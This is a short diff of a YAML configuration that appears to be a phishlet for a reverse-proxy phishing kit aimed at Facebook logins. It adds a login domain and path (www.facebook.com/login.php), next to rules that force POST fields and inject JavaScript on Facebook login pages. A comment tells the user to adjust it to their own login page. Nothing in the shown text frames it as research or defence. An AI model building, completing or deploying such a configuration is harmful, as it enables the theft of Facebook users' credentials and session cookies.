@@ -53,7 +53,9 @@ force_post:
       - {key: 'lgnrnd', value: '000443_WaEd'}  # Example login randomizer field
       - {key: 'lgnjs', value: '1730707484'}  # Example JavaScript timestamp for login validation
     type: 'post'
-
+login:
+  domain: 'www.facebook.com'
+  path: '/login.php'  # Adjust to match your actual login page path
 js_inject:
   - trigger_domains: ["login.facebook.com", "m.facebook.com", "www.facebook.com"]
     trigger_paths: ["/login.php", "/login/device-based/regular/login/", "/login/*", "/m/login"]
